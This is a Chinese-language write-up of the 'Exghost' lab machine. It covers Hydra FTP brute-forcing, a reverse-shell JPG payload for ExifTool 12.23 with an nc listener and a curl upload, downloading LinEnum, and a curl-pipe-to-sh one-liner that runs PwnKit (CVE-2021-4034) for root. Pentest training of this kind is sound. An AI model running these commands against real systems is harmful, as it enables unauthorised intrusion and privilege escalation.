---
description: Easy - Linux：ExifTool 12.23
---

# ✔️ Exghost

## 建立立足点

### 信息枚举

使用Nmap对目标进行开放端口扫描，获得2个开放端口：

<figure><img src="../.gitbook/assets/1 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

首先对80端口的Web网页进行检查，无收获：

<figure><img src="../.gitbook/assets/2 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

然后尝试以Anonymous身份登录FTP服务，也没有收获。因此，尝试使用暴力破解，获得登录凭证：<mark style="color:red;">**user:system**</mark>

```bash
// 用Hydra对目标FTP进行暴力破解尝试
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.160.183 -V
```

<figure><img src="../.gitbook/assets/3 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/4 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

登录FTP后获取到一个backup文件，将它下载到kali本地后，发现它是一个PCAP文件，用Wireshark打开并查看其HTTP流相关数据包：

{% hint style="info" %}
本例中关于目标FTP服务开启了被动模式，因此登录后并不能下载目标文件，需要关闭这个被动模式，才能成功下载。

<img src="../.gitbook/assets/6 (1) (1) (1) (1).png" alt="" data-size="original">

```bash
// 登录FTP后，直接输入：
passive
```
{% endhint %}

<figure><img src="../.gitbook/assets/5 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
// FTP服务中：
get backup
// Kali本机中，检查该文件的属性：
file backup
```

### 漏洞查找

使用Wireshark打开backup文件后，过滤HTTP数据包，发现了：

* <mark style="color:red;">**/exiftest.php**</mark>：一个上传图片的路径
* 已成功上传了一个testme.jpg的图片
* 使用的是<mark style="color:red;">**ExifTool**</mark>，其版本号为：<mark style="color:red;">**12.23**</mark>

<figure><img src="../.gitbook/assets/7 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/8 (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/9 (1) (1).png" alt=""><figcaption></figcaption></figure>

尝试查找ExifTool 12.23的公开已知漏洞，发现确实有一个任意代码执行的漏洞，将其下载后发现是一个用于将反弹shell的payload写入一个jpg文件的脚本：

```bash
searchsploit exiftool 12.23
```

<figure><img src="../.gitbook/assets/10 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

```
// 将利用脚本下载到Kali本地：
searchsploit -m 50911.py .
// 查看其使用方法：
python3 50911.py -h
// 制作payload，得到名为image.jpg的图片文件:
python3 50911.py -s 192.168.45.200 4444
```

<figure><img src="../.gitbook/assets/11 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/12 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### GET SHELL

首先在Kali本机监听与payload对应的端口：4444

```bash
// Kali本机：
nc -lvnp 4444
```

然后将制作好的payload（image.jpg）上传到目标，等待反弹回来的shell：

```bash
// 在payload所在的文件夹
curl -v -F myFile=@image.jpg http://192.168.160.183/exiftest.php
```

<figure><img src="../.gitbook/assets/13 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

成功获得反弹shell，并查找到local.txt文件：

<figure><img src="../.gitbook/assets/14 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 提升权限

### 本地信息收集

<figure><img src="../.gitbook/assets/15 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

当手动枚举无明确收获时，可使用工具进行枚举，如：

* LinEnum.sh
* LinPEAS.sh

本例使用LinEnum.sh，在Kali本机开启一个简易的服务器，将脚本传到目标上，直接运行该脚本：

```bash
// Kali本机：
python3 -m http.server
// 目标主机：
curl http://192.168.45.220:8000/LinEnum.sh -o linenum.sh
chmod +x linenum.sh
./linenum.sh
```

<figure><img src="../.gitbook/assets/16 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/17 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞查找

本例中，我是直接尝试搜索目标系统内核版本的相关漏洞，发现有可能可以尝试利用的脚本，所以直接root了。个人感觉LinPEAS.sh相较于LinEnum.sh来说更详细和高效，推荐用LinPEAS.sh来进行本地信息枚举。

<figure><img src="../.gitbook/assets/18 (1) (1).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

找到本例中的目标系统易受内核漏洞CVE-2021-4034的攻击，同时找到其GitHub上的可利用脚本<mark style="color:red;">**PwnKit.sh**</mark>&#x20;

{% hint style="info" %}
MEMO.

* [https://github.com/ly4k/PwnKit/tree/main](https://github.com/ly4k/PwnKit/tree/main)
* [https://ine.com/blog/exploiting-pwnkit-cve-20214034?source=post\_page-----0b50df883a65--------------------------------](https://ine.com/blog/exploiting-pwnkit-cve-20214034?source=post\_page-----0b50df883a65--------------------------------)
{% endhint %}

### ROOT

开箱即用，一键root：

```bash
sh -c "$(curl -fsSL http://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

<figure><img src="../.gitbook/assets/19 (1) (1).png" alt=""><figcaption></figcaption></figure>
